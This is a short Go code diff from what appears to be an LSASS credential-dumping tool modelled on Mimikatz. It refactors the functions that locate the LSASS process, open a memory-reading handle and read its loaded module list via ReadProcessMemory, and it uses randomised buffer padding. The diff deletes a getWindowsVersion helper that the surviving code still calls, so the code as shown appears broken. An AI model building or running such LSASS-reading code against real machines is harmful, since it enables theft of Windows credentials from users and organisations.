@@ -157,15 +157,6 @@ func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
 	return kiwi.pid, nil
 }
 
-func (kiwi *Kiwi) getWindowsVersion() (major, minor, build uint32) {
-	kiwi.mu.Lock()
-	defer kiwi.mu.Unlock()
-	if kiwi.major == 0 {
-		kiwi.major, kiwi.minor, kiwi.build = api.GetVersionNumber()
-	}
-	return kiwi.major, kiwi.minor, kiwi.build
-}
-
 func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
 	major, _, _ := kiwi.getWindowsVersion()
 	var da uint32 = windows.PROCESS_VM_READ
@@ -238,7 +229,7 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 		bufAddr := ldrEntry.BaseDLLName.Buffer
 		size = uintptr(ldrEntry.BaseDLLName.MaximumLength)
 		baseDLLName := make([]byte, int(size)+256+kiwi.rand.Int(512))
-		_, err = api.ReadProcessMemory(pHandle, bufAddr, (*byte)(unsafe.Pointer(&baseDLLName[0])), size)
+		_, err = api.ReadProcessMemory(pHandle, bufAddr, &baseDLLName[0], size)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to read base dll name")
 		}
